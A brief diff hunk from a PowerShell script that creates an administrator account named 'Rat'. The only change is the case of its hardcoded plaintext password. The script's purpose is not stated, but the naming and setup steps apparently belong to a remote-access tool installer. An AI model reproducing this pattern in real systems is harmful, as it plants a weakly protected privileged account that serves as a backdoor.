@@ -31,7 +31,7 @@ $initial_dir = Get-Location
 
 # create admin user
 $uname = Rat
-$pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
+$pword = (ConvertTo-SecureString "rat123" -AsPlainText -Force)
 Create_account -uname $uname -pword $pword
 
 # go to temp, make working directory
